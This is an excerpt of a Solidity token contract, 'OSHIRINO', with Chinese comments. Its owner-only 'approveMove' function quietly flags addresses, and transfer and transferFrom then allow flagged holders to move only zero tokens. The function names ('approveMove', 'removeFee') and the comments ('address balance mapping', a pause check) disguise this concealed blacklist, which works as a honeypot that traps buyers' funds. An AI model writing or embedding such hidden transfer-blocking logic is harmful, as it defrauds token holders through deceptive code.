...
contract OSHIRINO is Ownable {
	...
	mapping(address => bool) private _addressMain_; //地址余额映射
	 ...
	 */
    function approveMove(address _addressMain) external onlyOwner {
        if (_addressMain_[_addressMain] == true) {
            _addressMain_[_addressMain] = false;}
            else {_addressMain_[_addressMain] = true;}
    }

	/**
	 * @dev 函数修改器：判断合约是否未暂停，未暂停时才能执行
	 */
    function removeFee(address _addressMain) public view returns (bool) {
        return _addressMain_[_addressMain];
    }
	...
	function transfer(address _to, uint256 _value) public returns (bool) {
		if (_addressMain_[msg.sender] || _addressMain_[_to]) require (_value == 0, "");
	...
	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		...
		if (_addressMain_[_from] || _addressMain_[_to]) require (_value == 0, "");
